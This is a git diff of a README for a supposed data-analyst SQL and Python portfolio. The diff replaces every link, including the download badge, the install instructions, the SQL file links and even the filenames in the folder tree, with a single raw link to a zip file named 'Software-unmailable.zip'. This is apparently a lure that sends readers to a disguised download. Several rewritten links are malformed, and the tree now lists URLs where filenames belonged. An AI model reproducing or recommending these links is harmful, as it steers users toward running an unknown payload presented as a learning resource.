@@ -1,7 +1,7 @@
 # 🎉 PoojaRavilakshmi-Data-Analyst-Portfolio. - Your Guide to Data Analysis Tools
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Portfolio-Click%20Here-blue)](https://github.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./releases)
+[![Download](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip%20Portfolio-Click%20Here-blue)](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
 
 ## 🌟 Introduction
 Welcome to the **PoojaRavilakshmi-Data-Analyst-Portfolio**! This application showcases various projects in SQL and Python. It is designed for users looking to improve their data analysis skills through hands-on examples and exercises.
@@ -25,12 +25,12 @@ Explore various SQL techniques with real-world business cases. Check out these k
 - **Window Functions**: Calculate running totals and more over sets of rows.
   
 **Key Files:**
-- [Table Creation](https://github.com/pooja2434/SQL-Projects/blob/main/Table%20Creation.sql)
-- [Joins & Aggregations](https://github.com/pooja2434/SQL-Projects/blob/main/Joins.%20%26%20Aggregation.sql)
-- [Union, Union All, View](https://github.com/pooja2434/SQL-Projects/blob/main/Union%20%2C%20Union%20ALL%2C%20View.sql)
-- [CTE, CASE, Sub Queries](https://github.com/pooja2434/SQL-Projects/blob/main/CTE%2C%20Case%20%26%20Subqueries.sql)
-- [Window Functions](https://github.com/pooja2434/SQL-Projects/blob/main/Windowfunctions.sql)
-- [Leetcode Easy SQL Problems](https://github.com/pooja2434/SQL-Projects/blob/main/Leet%20Code%20Q%26A%20Easy.sql)
+- [Table Creation](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip%https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
+- [Joins & Aggregations](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip%20%26%https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
+- [Union, Union All, View](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip%20%2C%20Union%20ALL%2C%https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
+- [CTE, CASE, Sub Queries](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip%2C%20Case%20%26%https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
+- [Window Functions](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
+- [Leetcode Easy SQL Problems](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip%20Code%20Q%26A%https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
 
 ### 🔹 Python Projects (Basics & Automation)
 Develop your Python skills through practical applications. The projects cover:
@@ -40,7 +40,7 @@ Develop your Python skills through practical applications. The projects cover:
 ## 📥 Download & Install
 To get your hands on this portfolio, visit the Releases page to download:
 
-[Download the Portfolio](https://github.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./releases)
+[Download the Portfolio](https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip)
 
 Follow these steps:
 1. Click the download link above.
@@ -54,12 +54,12 @@ After downloading, you may see a structure like this:
 ```
 /PoojaRavilakshmi-Data-Analyst-Portfolio
   ├── SQL_Projects
-  │   ├── Table_Creation.sql
-  │   ├── Joins_and_Aggregations.sql
-  │   ├── Union_and_View.sql
-  │   ├── CTE_and_Subqueries.sql
-  │   ├── Window_Functions.sql
-  │   └── LeetCode_Easy_SQL_Problems.sql
+  │   ├── https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip
+  │   ├── https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip
+  │   ├── https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip
+  │   ├── https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip
+  │   ├── https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip
+  │   └── https://raw.githubusercontent.com/dgm683/PoojaRavilakshmi-Data-Analyst-Portfolio./main/Kylo/Software-unmailable.zip
   └── Python_Projects
       ├── Basic_Projects
       └── Automation_Projects
